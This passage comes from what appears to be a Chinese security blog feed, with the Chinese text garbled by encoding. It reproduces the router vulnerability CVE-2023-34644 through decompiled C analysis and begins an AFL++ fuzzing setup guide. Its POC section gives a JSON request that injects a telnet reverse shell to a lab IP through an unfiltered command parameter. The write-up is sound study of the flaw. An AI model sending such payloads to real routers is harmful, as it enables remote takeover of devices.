)</span><br><span class="line">    sem_init(v7 + <span class="number">36</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">  pthread_mutex_unlock(&amp;unk_4360B8);</span><br><span class="line">  sem_post(&amp;unk_4360A8);</span><br><span class="line">  <span class="keyword">return</span> v7;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªå‡½æ•°çš„ä¸»è¦åŠŸèƒ½æ˜¯å°†å¼‚æ­¥å‘½ä»¤æ¨é€åˆ°é˜Ÿåˆ—ä¸­</p><h5 id="è¯¦ç»†åˆ†æ"><a href="#è¯¦ç»†åˆ†æ" class="headerlink" title="è¯¦ç»†åˆ†æ"></a>è¯¦ç»†åˆ†æ</h5><p><strong>è·å–å½“å‰é˜Ÿåˆ—å¤´æŒ‡é’ˆ</strong>ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v20 = (_DWORD *)dword_435DE0;</span><br></pre></td></tr></table></figure><ul><li><code>dword_435DE0</code> æ˜¯ä¸€ä¸ªå…¨å±€å˜é‡ï¼ŒæŒ‡å‘å½“å‰é˜Ÿåˆ—çš„å¤´ã€‚å°†å…¶å€¼å­˜å‚¨åœ¨ <code>v20</code> ä¸­ã€‚</li></ul><p><strong>è®¾ç½®æ–°ä»»åŠ¡çš„ <code>next</code> æŒ‡é’ˆ</strong>ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*(_DWORD *)(v7 + <span class="number">60</span>) = &amp;commit_task_head;</span><br></pre></td></tr></table></figure><ul><li><code>v7</code> æ˜¯æ–°åˆ†é…çš„ä»»åŠ¡ç»“æ„çš„åŸºåœ°å€ã€‚</li><li>å‡è®¾ä»»åŠ¡ç»“æ„çš„ç¬¬ 60 å­—èŠ‚å¤„å­˜å‚¨çš„æ˜¯æŒ‡å‘ä¸‹ä¸€ä¸ªä»»åŠ¡çš„æŒ‡é’ˆã€‚</li><li>å°†è¿™ä¸ªä½ç½®åˆå§‹åŒ–ä¸º <code>&amp;commit_task_head</code>ï¼Œè¡¨ç¤ºæ–°ä»»åŠ¡çš„ä¸‹ä¸€ä¸ªä»»åŠ¡æ˜¯é˜Ÿåˆ—å¤´ï¼ˆåˆå§‹ä¸ºç©ºï¼‰ã€‚</li></ul><p><strong>æ›´æ–°é˜Ÿåˆ—å¤´æŒ‡é’ˆ</strong>ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dword_435DE0 = v7 + <span class="number">60</span>;</span><br></pre></td></tr></table></figure><ul><li>å°†å…¨å±€é˜Ÿåˆ—å¤´æŒ‡é’ˆ <code>dword_435DE0</code> æ›´æ–°ä¸ºæ–°ä»»åŠ¡çš„ <code>next</code> æŒ‡é’ˆä½ç½®ï¼Œå³ <code>v7 + 60</code>ã€‚</li></ul><p><strong>ä¿å­˜å½“å‰é˜Ÿåˆ—é•¿åº¦</strong>ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v21 = dword_4360A4;</span><br></pre></td></tr></table></figure><ul><li><code>dword_4360A4</code> æ˜¯å½“å‰é˜Ÿåˆ—çš„é•¿åº¦ã€‚å°†å…¶å€¼å­˜å‚¨åœ¨ <code>v21</code> ä¸­ã€‚</li></ul><p><strong>æ›´æ–°æ–°ä»»åŠ¡çš„ <code>prev</code> æŒ‡é’ˆ</strong>ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*(_DWORD *)(v7 + <span class="number">64</span>) = v20;</span><br></pre></td></tr></table></figure><ul><li>å‡è®¾ä»»åŠ¡ç»“æ„çš„ç¬¬ 64 å­—èŠ‚å¤„å­˜å‚¨çš„æ˜¯æŒ‡å‘å‰ä¸€ä¸ªä»»åŠ¡çš„æŒ‡é’ˆã€‚</li><li>å°†è¿™ä¸ªä½ç½®è®¾ç½®ä¸ºä¹‹å‰çš„é˜Ÿåˆ—å¤´ï¼Œå³ <code>v20</code>ã€‚</li></ul><p><strong>æ›´æ–°ä¹‹å‰å¤´ä»»åŠ¡çš„ <code>next</code> æŒ‡é’ˆ</strong>ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*v20 = v7 + <span class="number">60</span>;</span><br></pre></td></tr></table></figure><ul><li>å°†ä¹‹å‰é˜Ÿåˆ—å¤´ä»»åŠ¡çš„ <code>next</code> æŒ‡é’ˆæ›´æ–°ä¸ºæ–°ä»»åŠ¡çš„ <code>next</code> æŒ‡é’ˆä½ç½®ï¼Œå³ <code>v7 + 60</code>ã€‚</li></ul><p><strong>æ›´æ–°é˜Ÿåˆ—é•¿åº¦</strong>ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dword_4360A4 = v21 + <span class="number">1</span>;</span><br></pre></td></tr></table></figure><ul><li>å¢åŠ é˜Ÿåˆ—é•¿åº¦ <code>dword_4360A4</code> çš„å€¼ã€‚</li></ul><p><strong>è®¾ç½®ä»»åŠ¡çŠ¶æ€</strong>ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*(_BYTE *)(v7 + <span class="number">32</span>) = v3;</span><br></pre></td></tr></table></figure><ul><li>å‡è®¾ä»»åŠ¡ç»“æ„çš„ç¬¬ 32 å­—èŠ‚å¤„å­˜å‚¨çš„æ˜¯ä»»åŠ¡çŠ¶æ€ã€‚</li><li>å°†è¿™ä¸ªä½ç½®è®¾ç½®ä¸ºå‚æ•° <code>v3</code> çš„å€¼ã€‚</li></ul><p><strong>åˆå§‹åŒ–ä¿¡å·é‡ï¼ˆå¦‚æœéœ€è¦ï¼‰</strong>ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!v3)</span><br><span class="line">  sem_init(v7 + <span class="number">36</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br></pre></td></tr></table></figure><ul><li>å¦‚æœ <code>v3</code> ä¸º 0ï¼Œåˆ™åˆå§‹åŒ–ä»»åŠ¡ç»“æ„çš„ç¬¬ 36 å­—èŠ‚å¤„çš„ä¿¡å·é‡ã€‚</li></ul><p><strong>è§£é”äº’æ–¥é”</strong>ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pthread_mutex_unlock(&amp;unk_4360B8);</span><br></pre></td></tr></table></figure><ul><li>è§£é”ä¹‹å‰åŠ çš„äº’æ–¥é” <code>unk_4360B8</code>ã€‚</li></ul><p><strong>é‡Šæ”¾ä¿¡å·é‡</strong>ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sem_post(&amp;unk_4360A8);</span><br></pre></td></tr></table></figure><ul><li>é‡Šæ”¾ä¿¡å·é‡ <code>unk_4360A8</code>ï¼Œè¡¨ç¤ºæœ‰æ–°ä»»åŠ¡åŠ å…¥é˜Ÿåˆ—ã€‚</li></ul><p><strong>è¿”å›æ–°ä»»åŠ¡çš„æŒ‡é’ˆ</strong>ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> v7;</span><br></pre></td></tr></table></figure><ul><li>è¿”å›æ–°åˆ†é…çš„ä»»åŠ¡ç»“æ„çš„åŸºåœ°å€ <code>v7</code>ã€‚</li></ul><p>æ³¨æ„åˆ°æœ€åä½¿ç”¨<code>sem_post</code>çš„åŸå­æ“ä½œï¼Œå°†ä¿¡å·é‡åŠ ä¸Šäº†<code>1</code>ã€‚å› æ­¤ï¼Œåº”è¯¥<strong>ä¼šæœ‰å…¶ä»–åœ°æ–¹åœ¨æ£€æµ‹åˆ°ä¿¡å·é‡å‘ç”Ÿæ”¹å˜åï¼Œå¯¹æ•°æ®è¿›è¡Œå¤„ç†</strong>ã€‚</p><p>æ„å‘³ç€å…¶ä»–åœ°æ–¹åº”è¯¥æ˜¯æœ‰sem_waité˜»å¡äº†ä¸€ä¸ªçº¿ç¨‹çš„æ‰§è¡Œ</p><blockquote><ul><li><code>sem_wait</code> ç”¨äºç­‰å¾…ä¿¡å·é‡ã€‚å¦‚æœä¿¡å·é‡çš„å€¼ä¸ºé›¶ï¼Œå®ƒä¼šé˜»å¡ç›´åˆ°ä¿¡å·é‡çš„å€¼å¤§äºé›¶ã€‚</li><li><code>sem_post</code> ç”¨äºé‡Šæ”¾ä¿¡å·é‡ï¼Œå°†ä¿¡å·é‡çš„å€¼åŠ ä¸€ï¼Œå¹¶å”¤é†’ç­‰å¾…çš„çº¿ç¨‹ï¼ˆå¦‚æœæœ‰ï¼‰ã€‚</li><li>ä¸»è¦æ˜¯å®ç°çº¿ç¨‹é—´çš„åŒæ­¥å’Œäº’æ–¥ï¼Œç¡®ä¿ç¨‹åºå®‰å…¨è¿è¡Œ</li></ul></blockquote><p>å¯¹å…¶è¿›è¡Œäº¤å‰å¼•ç”¨å‘ç°</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall __noreturn <span class="title function_">sub_41AFC8</span><span class="params">(<span class="type">int</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// $s0</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// $a0</span></span><br><span class="line"></span><br><span class="line">  pthread_setcanceltype(<span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  v2 = pthread_self();</span><br><span class="line">  pthread_detach(v2);</span><br><span class="line">  prctl(<span class="number">15</span>, <span class="string">&quot;exec_cmd_task&quot;</span>);</span><br><span class="line">  *(_BYTE *)(a1 + <span class="number">8</span>) = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      sem_wait(&amp;unk_4360A8);</span><br><span class="line">      pthread_mutex_lock(<span class="number">4415672</span>);</span><br><span class="line">      v3 = commit_task_head;</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="type">int</span> *)commit_task_head == &amp;commit_task_head )</span><br><span class="line">      &#123;</span><br><span class="line">        v4 = <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        v4 = commit_task_head - <span class="number">60</span>;</span><br><span class="line">        *(_DWORD *)(*(_DWORD *)commit_task_head + <span class="number">4</span>) = *(_DWORD *)(commit_task_head + <span class="number">4</span>);</span><br><span class="line">        **(_DWORD **)(v3 + <span class="number">4</span>) = *(_DWORD *)v3;</span><br><span class="line">        *(_DWORD *)(v3 + <span class="number">4</span>) = <span class="number">0</span>;</span><br><span class="line">        *(_DWORD *)v3 = <span class="number">0</span>;</span><br><span class="line">        --dword_4360A4;</span><br><span class="line">      &#125;</span><br><span class="line">      pthread_mutex_unlock(&amp;unk_4360B8);</span><br><span class="line">      *(_DWORD *)(a1 + <span class="number">12</span>) = v4;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( !v4 );</span><br><span class="line">    *(_DWORD *)(a1 + <span class="number">4</span>) = dword_4360A0;</span><br><span class="line">    *(_BYTE *)(a1 + <span class="number">8</span>) = <span class="number">1</span>;</span><br><span class="line">    sub_41ADF0(v4);</span><br><span class="line">    *(_BYTE *)(a1 + <span class="number">8</span>) = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ( *(_BYTE *)(v4 + <span class="number">32</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      v5 = *(_DWORD *)(v4 + <span class="number">52</span>);</span><br><span class="line">      <span class="keyword">if</span> ( v5 )</span><br><span class="line">        <span class="built_in">free</span>(v5);</span><br><span class="line">      sub_41AD10(v4);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      sem_post(v4 + <span class="number">36</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    *(_DWORD *)(a1 + <span class="number">12</span>) = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä»sub_41AFC8å‡½æ•°ä¸­æ‰¾åˆ°ä»–çš„sem_waitå‡½æ•°</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">sub_41ADF0</span><span class="params">(_DWORD *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// $v0</span></span><br><span class="line">  _DWORD *v3; <span class="comment">// $v1</span></span><br><span class="line">  <span class="type">char</span> v4[<span class="number">128</span>]; <span class="comment">// [sp+20h] [-8Ch] BYREF</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [sp+A0h] [-Ch]</span></span><br><span class="line"></span><br><span class="line">  v1 = *a1;</span><br><span class="line">  <span class="keyword">if</span> ( *a1 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (a1[<span class="number">5</span>] &amp; <span class="number">2</span>) == <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      result = (*(<span class="type">int</span> (__fastcall **)(_DWORD *, _DWORD *))(v1 + <span class="number">68</span>))(a1 + <span class="number">1</span>, a1 + <span class="number">13</span>);</span><br><span class="line">      v3 = a1;</span><br><span class="line">LABEL_9:</span><br><span class="line">      v3[<span class="number">14</span>] = result;</span><br><span class="line">      <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">    v5 = v1 + <span class="number">76</span>;</span><br><span class="line">    pthread_mutex_lock(v1 + <span class="number">76</span>);</span><br><span class="line">    <span class="keyword">if</span> ( _sigsetjmp(v4, <span class="number">0</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      pthread_mutex_unlock(v5);</span><br><span class="line">      _pthread_unwind_next(v4);</span><br><span class="line">    &#125;</span><br><span class="line">    _pthread_register_cancel(v4);</span><br><span class="line">    <span class="keyword">if</span> ( *a1 )</span><br><span class="line">    &#123;</span><br><span class="line">      a1[<span class="number">14</span>] = (*(<span class="type">int</span> (__fastcall **)(_DWORD *, _DWORD *))(*a1 + <span class="number">68</span>))(a1 + <span class="number">1</span>, a1 + <span class="number">13</span>);</span><br><span class="line">      <span class="keyword">if</span> ( g_debug &gt;= <span class="number">2</span> )</span><br><span class="line">        uf_log_printf(</span><br><span class="line">          uf_log,</span><br><span class="line">          <span class="string">&quot;(%s %s %d)backgroup exec end[%s]&quot;</span>,</span><br><span class="line">          <span class="string">&quot;ufm_thd.c&quot;</span>,</span><br><span class="line">          <span class="string">&quot;exec_commit&quot;</span>,</span><br><span class="line">          <span class="number">220</span>,</span><br><span class="line">          (<span class="type">const</span> <span class="type">char</span> *)(*a1 + <span class="number">4</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    pthread_mutex_unlock(v5);</span><br><span class="line">    <span class="keyword">return</span> _pthread_unregister_cancel(v4);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !*((_BYTE *)a1 + <span class="number">32</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      result = ufm_popen((<span class="type">const</span> <span class="type">char</span> *)a1[<span class="number">7</span>], a1 + <span class="number">13</span>);</span><br><span class="line">      v3 = a1;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_9;</span><br><span class="line">    &#125;</span><br><span class="line">    uf_fork_as(a1[<span class="number">7</span>]);</span><br><span class="line">    result = <span class="number">231</span>;</span><br><span class="line">    <span class="keyword">if</span> ( g_debug &gt;= <span class="number">2</span> )</span><br><span class="line">      <span class="keyword">return</span> uf_log_printf(uf_log, <span class="string">&quot;(%s %s %d)uf_fork_as [%s]&quot;</span>, <span class="string">&quot;ufm_thd.c&quot;</span>, <span class="string">&quot;exec_commit&quot;</span>, <span class="number">231</span>, (<span class="type">const</span> <span class="type">char</span> *)a1[<span class="number">7</span>]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å‘ç°è¿™é‡Œæœ‰ä¸ªufm_popenå‡½æ•°ï¼Œè€Œa1[7]æ˜¾ç„¶æ˜¯åç§»28çš„ä½ç½®</p><p>å¯ä»¥çœ‹åˆ°</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">v19 = strdup(a2);</span><br><span class="line">*(_DWORD *)(v7 + <span class="number">28</span>) = v19;               <span class="comment">// å°†shellå­˜åœ¨28çš„ä½ç½®</span></span><br></pre></td></tr></table></figure><p>åœ¨async_cmd_push_queueå‡½æ•°ä¸­æ—©å·²å°†shellå­˜åˆ°äº†å½“å‰çš„ä½ç½®ï¼Œå› æ­¤æ‰§è¡Œè¯¥shellï¼Œä¸”æ²¡æœ‰ä»»ä½•çš„è¿‡æ»¤ï¼Œåˆ°æ­¤äºŒè¿›åˆ¶æ–‡ä»¶çš„åˆ†æå°±ç»“æŸäº†ï¼Œä½†æ˜¯æˆ‘è¿˜æ˜¯æœ‰äº›è®¸çš„ç–‘é—®</p><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;method&quot;</span><span class="punctuation">:</span> <span class="string">&quot;merge&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;params&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;sorry&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&#x27;$(mkfifo /tmp/test;telnet 192.168.121.101 6666 0&lt;/tmp/test|/bin/sh &gt; /tmp/test)&#x27;&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><h2 id="ç–‘é—®-è§£å†³"><a href="#ç–‘é—®-è§£å†³" class="headerlink" title="ç–‘é—®&amp;è§£å†³"></a>ç–‘é—®&amp;è§£å†³</h2><h4 id="ä¸ºä»€ä¹ˆä¸»æœºå’Œqemuæ— æ³•é€šä¿¡ï¼Ÿ"><a href="#ä¸ºä»€ä¹ˆä¸»æœºå’Œqemuæ— æ³•é€šä¿¡ï¼Ÿ" class="headerlink" title="ä¸ºä»€ä¹ˆä¸»æœºå’Œqemuæ— æ³•é€šä¿¡ï¼Ÿ"></a>ä¸ºä»€ä¹ˆä¸»æœºå’Œqemuæ— æ³•é€šä¿¡ï¼Ÿ</h4><p>é¦–å…ˆé—®é¢˜ç®—æ˜¯ä¸€ç§ç‰¹æ®Šæƒ…å†µï¼Œå› ä¸ºtap0åˆ†é…äº†ä¸¤ä¸ªipv4åœ°å€ï¼Œå¯¼è‡´å†²çª</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ip addr show tap0</span><br></pre></td></tr></table></figure><p>æŸ¥çœ‹å®Œåä»»æ„åˆ é™¤ä¸€ä¸ªåœ°å€å³å¯é€šä¿¡äº†ï¼Œå¯èƒ½æ˜¯é‡å¤é…ç½®çš„åŸå› å§</p><h2 id="ç»“è¯­"><a href="#ç»“è¯­" class="headerlink" title="ç»“è¯­"></a>ç»“è¯­</h2><p>è¿™ä¸ªæ¼æ´æ˜¯æˆ‘å¤ç°çš„ç¬¬äºŒä¸ªæ¼æ´ï¼Œæ”¶è·å¾ˆå¤šï¼Œç¬¬ä¸€æ¬¡æ„Ÿå—åˆ°è·¯ç”±å™¨çš„ç»„æˆï¼Œä¸è¿‡è¿˜æ˜¯æœ‰ç€è®¸å¤šçš„åå·ï¼Œæ„Ÿå—åˆ°äº†winmtå¸ˆå‚…çš„å¼ºå¤§ï¼Œåªèƒ½è¯´è¿å¤ç°éƒ½é‚£ä¹ˆåå·ï¼Œé‚£å¦‚ä½•å¯»æ‰¾æ¼æ´å‘¢ï¼Œè¿™æ¬¡å¤ç°ç»™äº†æˆ‘ä¸€ä¸ªæ€è·¯ä¾¿æ˜¯ä»å¯æ§å­—æ®µå‡ºå‘ï¼Œç„¶åå†ä»shellæ‰§è¡Œè¿”å›ï¼Œæ‰¾åˆ°äº¤æ±‡ç‚¹ï¼Œçœ‹èµ·æ¥åœ¨iotä¸Šæˆ‘è¿˜æœ‰å¾ˆå¤šçš„è·¯è¦èµ°</p><h2 id="å‚è€ƒæ–‡ç« "><a href="#å‚è€ƒæ–‡ç« " class="headerlink" title="å‚è€ƒæ–‡ç« "></a>å‚è€ƒæ–‡ç« </h2><p><a href="https://zikh26.github.io/posts/e5651b4f.html">https://zikh26.github.io/posts/e5651b4f.html</a></p><p><a href="https://bbs.kanxue.com/thread-277386.htm#msg_header_h2_4">https://bbs.kanxue.com/thread-277386.htm#msg_header_h2_4</a></p><p><a href="https://zhuanlan.zhihu.com/p/437933584">https://zhuanlan.zhihu.com/p/437933584</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;CVE-2023-34644&quot;&gt;&lt;a href=&quot;#CVE-2023-34644&quot; class=&quot;headerlink&quot; title=&quot;CVE-2023-34644&quot;&gt;&lt;/a&gt;CVE-2023-34644&lt;/h1&gt;&lt;h2 id=&quot;luciæ¡†æ¶å’Œluaæ–‡ä»¶&quot;&gt;&lt;a </summary>
      
    
    
    
    <category term="IOTå®‰å…¨" scheme="http://s1nec-1o.github.io/categories/IOT%E5%AE%89%E5%85%A8/"/>
    
    <category term="æ¼æ´å¤ç°" scheme="http://s1nec-1o.github.io/categories/IOT%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="IOTå®‰å…¨" scheme="http://s1nec-1o.github.io/tags/IOT%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>Fuzzåˆæ¢</title>
    <link href="http://s1nec-1o.github.io/2024/05/26/Fuzz%E5%88%9D%E6%8E%A2/"/>
    <id>http://s1nec-1o.github.io/2024/05/26/Fuzz%E5%88%9D%E6%8E%A2/</id>
    <published>2024-05-25T17:02:21.000Z</published>
    <updated>2024-05-25T17:10:55.053Z</updated>
    
    <content type="html"><![CDATA[<p>çœ‹ç½‘ä¸Šçš„è¯„ä»·fuzzå¥½åƒæ˜¯æŒ–æ¼æ´çš„é¦–é€‰å·¥å…·ï¼Œå°±å…ˆæµ…æµ…å­¦ä¹ ä¸€ä¸‹ï¼Œæˆ–è®¸å¯ä»¥æ‰¾æ‰¾ctfçš„åº”ç”¨åœºæ™¯ï¼Œå…ˆä»AFL++å¼€å§‹</p><h2 id="å®‰è£…"><a href="#å®‰è£…" class="headerlink" title="å®‰è£…"></a>å®‰è£…</h2><p>åœ¨å®‰è£…ä¹‹å‰AFL++è¦æ±‚è¦æœ‰llvmå’Œclang,ldd,gccç­‰ç¼–è¯‘å™¨</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install wget</span><br><span class="line">wget https://apt.llvm.org/llvm.sh</span><br><span class="line"><span class="built_in">chmod</span> +x llvm.sh</span><br><span class="line">sudo ./llvm.sh 13</span><br><span class="line">sudo apt install clang-13 lld-13 llvm-13</span><br></pre></td></tr></table></figure><p>ä¹‹åæ›´æ–°ç¯å¢ƒå˜é‡</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> PATH=/usr/lib/llvm-13/bin:<span class="variable">$PATH</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;export PATH=/usr/lib/llvm-13/bin:$PATH&#x27;</span> &gt;&gt; ~/.bashrc</span><br><span class="line"><span class="built_in">source</span> ~/.bashrc</span><br></pre></td></tr></table></figure><p>è®°ä½exportåªå¯¹æœ¬shellç”Ÿæ•ˆï¼Œbashrcåªå¯¹ä¹‹åèµ·çš„shellç”Ÿæ•ˆ</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc --version</span><br></pre></td></tr></table></figure><p> å‡è®¾è¾“å‡ºæ˜¾ç¤ºæ‚¨çš„GCCç‰ˆæœ¬æ˜¯9.xx.xx</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install gcc-9-plugin-dev</span><br></pre></td></tr></table></figure><p>ä¹‹åä¾¿å¯ä»¥ä¸‹è½½ä¾èµ–ç„¶åä¸‹è½½AFL++ä¹‹åç¼–è¯‘</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo apt update</span><br><span class="line">$ sudo apt install git make build-essential clang ninja-build pkg-config libglib2.0-dev libpixman-1-dev</span><br><span class="line">$ git <span class="built_in">clone</span> https://github.91chi.fun/https://github.com/AFLplusplus/AFLplusplus.git</span><br><span class="line">$ <span class="built_in">cd</span> AFLplusplus</span><br><span class="line">$ make all</span><br></pre></td></tr></table></figure><p>è¿™æ ·æ²¡æœ‰errorçš„è¯å°±å®ŒæˆAFL++çš„åŸºæœ¬å®‰è£…</p><p>å¦‚æœæŠ¥é”™å°±çœ‹æŠ¥é”™è§£å†³ï¼Œå…ˆç™¾åº¦ï¼Œå¦‚æœæœ‰ç½‘ä¸Šæ²¡æœ‰çš„è¯å¯ä»¥ä¸æˆ‘è®¨è®ºï¼Œå³ä½¿æˆ‘å¤§æ¦‚ç‡ä¹Ÿä¸ä¼š</p><h2 id="AFL-çš„ä½¿ç”¨"><a href="#AFL-çš„ä½¿ç”¨" class="headerlink" title="AFL++çš„ä½¿ç”¨"></a>AFL++çš„ä½¿ç”¨</h2><p>é¦–å…ˆæ˜¯æµ‹è¯•ï¼Œå°±å€Ÿç”¨[ç½‘ä¸Šçš„æºç ](<a 